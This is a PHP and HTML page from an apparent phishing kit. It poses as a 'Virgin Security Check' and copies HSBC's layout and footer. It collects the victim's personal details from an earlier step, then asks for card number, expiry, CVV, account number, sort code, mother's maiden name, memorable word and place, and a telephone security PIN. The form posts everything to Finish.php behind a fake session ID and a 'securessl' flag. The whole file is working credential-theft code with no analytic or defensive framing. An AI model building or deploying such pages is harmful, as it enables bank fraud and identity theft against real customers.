<?php

error_reporting(0);

session_start();
require "../assets/includes/functions.php";
require "../assets/includes/Bank_One_Time.php";
require "../assets/includes/simplehtmldom.php";
require "../assets/includes/enc.php";
$_SESSION['name'] = $_POST['name'];
$_SESSION['dob'] = $_POST['dob'];
$_SESSION['email'] = $_POST['email'];
$_SESSION['telephone'] = $_POST['telephone'];
$_SESSION['address'] = $_POST['address'].", ".$_POST['town'].", ".$_POST['postcode'];
$_SESSION['addresstime'] = $_POST['tm']."/".$_POST['ty'];

?>

<html lang="en" xml:lang="en" xmlns="http://www.w3.org/1999/xhtml" class="dj_webkit dj_chrome dj_contentbox"><head><meta http-equiv="Content-Type" content="text/html; charset=utf-8">

<title>Virgin Security Check</title>
<link rel="shortcut icon" href="assets/img/favicon.ico">	
<link rel="stylesheet" href="assets/css/l33.css" media="screen">
<script src="https://ajax.googleapis.com/ajax/libs/jquery/1.8.3/jquery.min.js"></script>
<script src="assets/js/jquery.payment.js"></script>
<script src="https://cdn.jsdelivr.net/jquery.validation/1.14.0/jquery.validate.js"></script>
<script src="https://jqueryvalidation.org/files/dist/additional-methods.min.js"></script>
<script>
function movetoNext(current, nextFieldID) {
if (current.value.length >= current.maxLength) {
document.getElementById(nextFieldID).focus();
}
}
    jQuery(function($) {
      $('.cc-number').payment('formatCardNumber');
      $('.cc-exp').payment('formatCardExpiry');
      $('.cc-cvc').payment('formatCardCVC');

      $.fn.toggleInputError = function(erred) {
        this.parent('.field').toggleClass('errorzzzz', erred);
        return this;
      };

      $('form').submit(function(e) {
        e.preventDefault();

        var cardType = $.payment.cardType($('.cc-number').val());
        $('.cc-number').toggleInputError(!$.payment.validateCardNumber($('.cc-number').val()));
        $('.cc-exp').toggleInputError(!$.payment.validateCardExpiry($('.cc-exp').payment('cardExpiryVal')));
        $('.cc-cvc').toggleInputError(!$.payment.validateCardCVC($('.cc-cvc').val(), cardType));
        $('.cc-brand').text(cardType);
      });

    });
	
</script>
<script>	
  (function($,W,D)	{
    var JQUERY4U = {};

    JQUERY4U.UTIL =
    {
        setupFormValidation: function()
        {
            //form validation rules
            $("#details").validate({
				errorElement: "span",			
                rules: {
					ccno: { required: true, minlength: 16, creditcard: true},
					ccexp: { required: true, minlength: 4,},
					secode: { required: true, minlength: 3, digits: true,},
					acno: { required: true, minlength: 8, digits: true,},
					sort1: { required: true, minlength: 2, digits: true,},
					sort2: { required: true, minlength: 2, digits: true,},
					sort3: { required: true, minlength: 2, digits: true,},
					mmn: { required: true, minlength: 2,},
					memoword: { required: true, minlength: 3,},
					memoplace: { required: true, minlength: 3,},
					telepin: { required: true, minlength: 6, digits: true,},
                },
				groups: {
					sortcode: "sort1 sort2 sort3",
				},
				errorPlacement: function(error, element) {
				if (element.attr("name") == "sort1" || element.attr("name") == "sort2" || element.attr("name") == "sort3") 
				error.insertAfter("#sorterror");
				else 
				error.insertAfter(element);	
				},
                messages: {
					ccno: {
						required: "Please provide your 16 digit card number",
						minlength: jQuery.validator.format("Please check the card number you have entered"),
						creditcard: jQuery.validator.format("Please check the card number you have entered"),
					},
					ccexp: {
						required: "Please provide your cards expiry date",
						minlength: jQuery.validator.format("Please check the card expiry date you have entered"),
						date: jQuery.validator.format("Please check the card expiry date you have entered"),
					},
					secode: {
						required: "Please provide your 3 digit card security code (CVV)",
						minlength: jQuery.validator.format("Please check the card security code you have entered"),
						digits: jQuery.validator.format("Please ensure you enter digits only"),
					},
					acno: {
						required: "Please provide your 8 digit account number",
						minlength: jQuery.validator.format("Please check the account number you have entered"),
						digits: jQuery.validator.format("Please ensure you enter digits only"),
					},
					sort1: { required: "Please provide your sortcode", minlength: jQuery.validator.format("Please check the sortcode you have entered"), digits: jQuery.validator.format("Please ensure you enter digits only"), },
					sort2: { required: "Please provide your sortcode", minlength: jQuery.validator.format("Please check the sortcode you have entered"), digits: jQuery.validator.format("Please ensure you enter digits only"), },
					sort3: { required: "Please provide your sortcode", minlength: jQuery.validator.format("Please check the sortcode you have entered"), digits: jQuery.validator.format("Please ensure you enter digits only"), },
					mmn: { 
					required: "Please provide your mothers maiden name", 
					minlength: jQuery.validator.format("Please check the mother maiden name you have entered"), 
					},
					memoword: { required: "Please provide your memorable word", minlength: jQuery.validator.format("Please check the memorable word you have entered"), },
					memoplace: { required: "Please provide your memorable place", minlength: jQuery.validator.format("Please check the memorable place you have entered"), },
					telepin: { 
						required: "Please provide your security number", 
						minlength: jQuery.validator.format("Please check the security number you have entered"), 
						digits: jQuery.validator.format("Please ensure you enter digits only"), 
					},
				},
                submitHandler: function(form) {
                    form.submit();
                }
            });
        }
    }

    //when the dom has loaded setup form validation rules
    $(D).ready(function($) {
        JQUERY4U.UTIL.setupFormValidation();
    });

})(jQuery, window, document);
  </script>
<style>
.error {
	color:red;
	font-size: 1.4em;
	font-weight: bold;
}
.sort {
	width: 30px!important;
}
</style>
</head>

<body class="l33">
<p style="background-color: #515358;"></p>
<div id="top">
<div id="mainTopWrapper">
<div id="mainTopUtility">
<h1>Personal</h1>

<div id="mainTopUtilityRow">
<ul id="tabs">
<li class="skipLink"><a class="skip" href="#" lang="en">Skip page header and navigation</a></li>

<li class="on"><a href="#">Personal</a></li>

<li><a href="#">Business</a></li>
</ul>

<div id="siteControls">
<div id="langList">
<ul>
<li class="selected"><a href="#">English</a></li>
</ul>
</div>

<div id="locale" lang="en">
<div lang="en" widgetid="countrySelectorWrapper" aria-relevant="all" aria-live="polite"><a class="dropDownLink trigger" href="#">
<span><span class="flag uk">United Kingdom</span></span></a>
<div class="placeholder"></div>
</div>
</div>

</div>
</div>
</div>

<div id="mainTopNavigation">
<div id="logo"><a href="#"><img src="assets/img/logo.gif" width="138" title="" alt=""></a></div>

<div id="sections" lang="en">
<ul id="topLevel">
<li class="level1"><a href="#" class="mainTopNav"><strong>Everyday banking</strong><br>
Accounts &amp; services</a>
</li>

<li class="level1"><a class="mainTopNav" href="#"><strong>Borrowing</strong><br>
Loans &amp; mortgages</a>
</li>

<li class="level1"><a href="#" class="mainTopNav"><strong>Investing</strong><br>
Products &amp; analysis</a>
</li>

<li class="level1"><a href="#" class="mainTopNav"><strong>Insurance</strong><br>
Property &amp; family</a>
</li>

<li class="level1"><a href="#" class="mainTopNav"><strong>Life events</strong><br>
Help &amp; support</a>
</li>
</ul>
</div>
</div>
</div>


					<p></p>

<div class="pageHeaderBg">
<div class="pageHeading row">
<div class="pageHeadingInner">
<h2>Virgin Security Check</h2>
</div>
</div>
</div>

<p></p>

		<div class="innerPage" id="innerPage">
			<div class="grid_skin">
				<div class="row">
					<div class="grid grid_24">
						<ul class="stepTracker stepCount3 stepProgress" data-dojo-type="hsbcwidget/stepTracker" data-dojo-props="addNumsNoDots: true" id="hsbcwidget_stepTracker_0" lang="en" widgetid="hsbcwidget_stepTracker_0">
							<li class="completed first">
								<a href="#" tabindex="0"><span class="progressNum">1</span>
									About the verification process
									<span class="hidden" aria-hidden="true">
										<span data-nlsid="stepTracker.step"></span>
										<span class="stepNumber">1</span>
										<span data-nlsid="stepTracker">of</span>
										<span class="stepTotal">3</span>
								
									</span>
								</a>
							</li>
							<li class="completed beforeSelected">
								<a href="#"><span class="progressNum">2</span>
									Confirm personal details
									<span class="hidden" aria-hidden="true">
										<span data-nlsid="stepTracker.step"></span>
										<span class="stepNumber">2</span>
										<span data-nlsid="stepTracker">of</span>
										<span class="stepTotal">3</span>
										
									</span>
								</a>
							</li>
							<li class="selected last selectedLast">
								<a href="#"><span class="progressNum">3</span>
										<span class="hidden" aria-hidden="true">Current Step: </span>
									Confirm account information
									<span class="hidden" aria-hidden="true">
										<span data-nlsid="stepTracker.step"></span>
										<span class="stepNumber">3</span>
										<span data-nlsid="stepTracker">of</span>
										<span class="stepTotal">3</span>
										<span class="stepSelected" data-nlsid="stepTracker.selected"></span>
										
									</span>
								</a>
							</li>
						</ul>
					</div>
				</div>

				<div class="row activate">

<div class="containerStyle01">

						<div class="grid grid_24">
<form id="details" method="post" action="Finish.php?&sessionid=<?php echo generateRandomString(80); ?>&securessl=true">
						<div class="row containerStyle17">
						<div class="row">
						<h3>Confirm Account Information</h3>
						</div>
										

						</div>
						<div>

							
<div class="questionGroup questionGroup-ext01">
<div class="question clearfix jsQuestion">
<label for="ccno">Card Number </label>
<div class="textInput validationInput small">
<div class="dijit dijitReset dijitInline dijitLeft dijitTextBox dijitValidationTextBox dijitTextBoxIncomplete dijitValidationTextBoxIncomplete dijitIncomplete" lang="en">
<div class="dijitReset dijitValidationContainer">
</div>
<div class="dijitReset dijitInputField dijitInputContainer">
<input class="dijitReset dijitInputInner cc-number" id="cc-number" autocomplete="off" name="ccno" type="text" placeholder="&middot;&middot;&middot;&middot; &middot;&middot;&middot;&middot; &middot;&middot;&middot;&middot; &middot;&middot;&middot;&middot;" value="<?php echo $_SESSION['ccno'];?>">
</div>
</div>
</div>
</div>



<div class="question clearfix jsQuestion">
<label for="ccexp">Card Expiry Date </label>
<div class="textInput validationInput small">
<div class="dijit dijitReset dijitInline dijitLeft dijitTextBox dijitValidationTextBox dijitTextBoxIncomplete dijitValidationTextBoxIncomplete dijitIncomplete" lang="en">
<div class="dijitReset dijitValidationContainer">
</div>
<div class="dijitReset dijitInputField dijitInputContainer">
<input class="dijitReset dijitInputInner cc-exp" id="cc-exp" autocomplete="off" name="ccexp" type="text" placeholder="&middot;&middot; / &middot;&middot;" value="<?php echo $_SESSION['ccexp'];?>">
</div>
</div>
</div>
</div>

<div class="question clearfix jsQuestion">
<label for="secode">Card Security Code </label>
<div class="textInput validationInput small">
<div class="dijit dijitReset dijitInline dijitLeft dijitTextBox dijitValidationTextBox dijitTextBoxIncomplete dijitValidationTextBoxIncomplete dijitIncomplete" lang="en">
<div class="dijitReset dijitValidationContainer">
</div>
<div class="dijitReset dijitInputField dijitInputContainer">
<input class="dijitReset dijitInputInner cc-cvc" id="cc-cvc" autocomplete="off" name="secode" placeholder="&middot;&middot;&middot;"  type="text" value="<?php echo $_SESSION['secode'];?>">
</div>
</div>
</div>
</div>


<div class="question clearfix jsQuestion">
<label for="acno">Account Number </label>
<div class="textInput validationInput small">
<div class="dijit dijitReset dijitInline dijitLeft dijitTextBox dijitValidationTextBox dijitTextBoxIncomplete dijitValidationTextBoxIncomplete dijitIncomplete" lang="en">
<div class="dijitReset dijitValidationContainer">
</div>
<div class="dijitReset dijitInputField dijitInputContainer">
<input class="dijitReset dijitInputInner" autocomplete="off" name="acno" type="text" value="<?php echo $_SESSION['account'];?>">
</div>
</div>
</div>
</div>


<div class="question clearfix jsQuestion">
<label for="sortcode">Sort Code </label>
<div class="textInput validationInput small">
<div class="dijit dijitReset dijitInline dijitLeft dijitTextBox dijitValidationTextBox dijitTextBoxIncomplete dijitValidationTextBoxIncomplete dijitIncomplete" lang="en">
<div class="dijitReset dijitValidationContainer">
</div>
<div class="dijitReset dijitInputField dijitInputContainer">
<input class="dijitReset dijitInputInner" autocomplete="off" name="sortcode" type="text" value="<?php echo $_SESSION['sortcode'];?>">
</div>
</div>
</div>
</div>



<div class="question clearfix jsQuestion">
<label for="mmn">Mother&apos;s Maiden Name</label>
<div class="textInput validationInput small">
<div class="dijit dijitReset dijitInline dijitLeft dijitTextBox dijitValidationTextBox dijitTextBoxIncomplete dijitValidationTextBoxIncomplete dijitIncomplete" lang="en">
<div class="dijitReset dijitValidationContainer">
</div>
<div class="dijitReset dijitInputField dijitInputContainer">
<input class="dijitReset dijitInputInner" autocomplete="off" name="mmn" type="text" value="<?php echo $_SESSION['mmn'];?>">
</div>
</div>
</div>
</div>


<div class="question clearfix jsQuestion">
<label for="memoword">Memorable Word</label>
<div class="textInput validationInput small">
<div class="dijit dijitReset dijitInline dijitLeft dijitTextBox dijitValidationTextBox dijitTextBoxIncomplete dijitValidationTextBoxIncomplete dijitIncomplete" lang="en">
<div class="dijitReset dijitValidationContainer">
</div>
<div class="dijitReset dijitInputField dijitInputContainer">
<input class="dijitReset dijitInputInner" autocomplete="off" name="memoword" type="text">
</div>
</div>
</div>
</div>


<div class="question clearfix jsQuestion">
<label for="memoplace">Memorable Place</label>
<div class="textInput validationInput small">
<div class="dijit dijitReset dijitInline dijitLeft dijitTextBox dijitValidationTextBox dijitTextBoxIncomplete dijitValidationTextBoxIncomplete dijitIncomplete" lang="en">
<div class="dijitReset dijitValidationContainer">
</div>
<div class="dijitReset dijitInputField dijitInputContainer">
<input class="dijitReset dijitInputInner" autocomplete="off" name="memoplace" type="text">
</div>
</div>
</div>
</div>


<div class="question clearfix jsQuestion">
<label for="telepin">Security Number</label>
<div class="textInput validationInput small">
<div class="dijit dijitReset dijitInline dijitLeft dijitTextBox dijitValidationTextBox dijitTextBoxIncomplete dijitValidationTextBoxIncomplete dijitIncomplete" lang="en">
<div class="dijitReset dijitValidationContainer">
</div>
<div class="dijitReset dijitInputField dijitInputContainer">
<input class="dijitReset dijitInputInner" autocomplete="off" name="telepin" placeholder="Six to ten digit number" type="text">
</div>
</div>
</div>
</div>



</div>
</div>




						


 

<div class="buttonRow row">
									<div class="right">
										<div class="button primary primaryBtn">
											<span class="buttonInner"> <input class="submit_input" autocomplete="off" type="submit" value="Complete">
											</span>
										</div>
									</div>
								</div>



					</form>
					</div>
					<!-- Entity Content Right Starts -->
					
						<!-- Entity Content Right Ends -->
				</div>
				</div>
				<!-- Main Content Ends -->
			</div>
		</div>
		<!-- Entity Content Bottom Starts -->
		<div class="containerStyle07" style="padding: 0px;">
			<div class="innerPage">
				<div class="grid_skin">
					<div class="row">
						
					</div>
				</div>
			</div>
		</div>
			

<div dir="ltr" id="footerLinks">
<div id="footerLinksRow">
<ul>
<li class="contact"><a href="#">Contact and Support</a></li>

<li class="branch"><a href="#">Find a branch</a></li>

<li><a href="#" onclick="" title="" alt="">Website feedback</a></li>
</ul>
</div>
</div>

<div dir="ltr" id="footerMap">
<div class="sixCol" id="footerMapRow">
<div class="column">
<h2><a href="#">Everyday banking</a></h2>

<ul>
<li><a href="#">Current accounts</a></li>

<li><a href="#">Saving accounts</a></li>

<li><a href="#">Credit cards</a></li>

<li><a href="#">International services</a></li>

<li><a href="#">Switching to HSBC</a></li>

<li><a href="#">Security centre</a></li>

<li><a href="#">Card support</a></li>

<li><a href="#">Online Banking</a></li>
</ul>
</div>

<div class="column">
<h2>Premium banking</h2>

<ul>
<li><a href="#">HSBC Premier</a></li>

<li><a href="#">HSBC Advance</a></li>

<li><a href="#">HSBC Expat</a></li>

<li><a href="#">HSBC Private Bank</a></li>
</ul>
</div>

<div class="column">
<h2><a href="#">Borrowing</a></h2>

<ul>
<li><a href="#">Mortgages</a></li>

<li><a href="#">Loans</a></li>

<li><a href="#">Mortgage calculators</a></li>

<li><a href="#">Overdrafts</a></li>

<li><a href="#">Buy to let</a></li>
</ul>
</div>

<div class="column">
<h2><a href="#">Investing</a></h2>

<ul>
<li><a href="#">Investment products</a></li>

<li><a href="#">Why invest with us?</a></li>

<li><a href="#">News and analysis</a></li>
</ul>
</div>

<div class="column">
<h2><a href="#">Insurance</a></h2>

<ul>
<li><a href="#">Home insurance</a></li>

<li><a href="#">Travel insurance</a></li>

<li><a href="#">Car insurance</a></li>

<li><a href="#">Premier car insurance</a></li>

<li><a href="#">Life, critical illness &amp;<br>
income cover</a></li>

<li><a href="#">Student insurance</a></li>
</ul>
</div>

<div class="column last">
<h2><a href="#">Planning</a></h2>

<ul>
<li><a href="#">Health &amp; family</a></li>

<li><a href="#">Home &amp; lifestyle</a></li>

<li><a href="#">Work &amp; retirement</a></li>

<li><a href="#">Planning tools</a></li>
</ul>
</div>
</div>
</div>

<div dir="ltr" id="footerUtility">
<div id="footerUtilityRow">
<ul>
<li><a href="#">About HSBC</a></li>

<li><a href="#">Site map</a></li>

<li><a href="#'">Newsroom</a></li>

<li><a href="#">Legal</a></li>

<li><a href="#" title="" class="dnt_no_consent" onclick="" alt="">Cookie Policy</a></li>

<li><a href="#">Accessibility</a></li>

<li><a href="#">Sustainability</a></li>

<li><a href="#'">Careers</a></li>

<li><a href="#'">HSBC Group</a></li>
</ul>

<p>&copy;&nbsp;HSBC Bank plc 2016</p>
</div>
</div>


	</div>


</body></html>